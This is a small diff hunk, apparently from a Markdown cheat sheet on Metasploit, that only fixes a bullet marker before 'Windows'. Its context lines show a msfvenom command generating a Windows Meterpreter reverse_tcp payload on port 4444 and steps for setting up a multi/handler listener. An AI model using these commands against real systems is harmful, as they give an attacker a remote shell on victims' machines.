@@ -37,7 +37,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your IP/sah) LPORT=4444 f> /d
 5. exploit
 ```
 
-•• Windows
+• Windows
 ```fish
 1. use exploit/multi/handler 
 2. set windows/meterpreter/reverse_tcp
